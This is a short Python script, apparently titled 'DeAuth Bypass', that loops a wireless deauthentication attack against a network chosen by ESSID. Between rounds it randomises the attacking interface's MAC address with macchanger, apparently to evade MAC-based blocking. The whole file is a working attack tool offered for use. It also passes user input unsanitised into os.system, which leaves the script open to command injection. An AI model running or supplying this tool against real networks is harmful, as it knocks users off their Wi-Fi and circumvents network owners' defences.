#Turn with python3
import os
import time

print(""" \033[31m
 ____          _         _   _       ____
|  _ \  ___   / \  _   _| |_| |__   | __ ) _   _ _ __   __ _ ___ ___
| | | |/ _ \ / _ \| | | | __| '_ \  |  _ \| | | | '_ \ / _` / __/ __|
| |_| |  __// ___ \ |_| | |_| | | | | |_) | |_| | |_) | (_| \__ \__ |
|____/ \___/_/   \_\__,_|\__|_| |_| |____/ \__, | .__/ \__,_|___/___/
                                           |___/|_|


""")
print("\033[37m By Julian Pedro F. Braga \n")

interface = input("Set Interface[' ']: ")
essid = input("Set ESSID[' ']: ")
delay = (int(input("Set Delay[' '] ")))
while True:
    command = (" aireplay-ng -0 1 -e "+ essid +" "+ interface +" | grep 'DeAuth' ")
    os.system(command)
    os.system("ifconfig "+ interface +" down")
    os.system("macchanger -r "+ interface +" | grep 'New MAC'")
    os.system("ifconfig "+ interface +" up")
    time.sleep(delay)
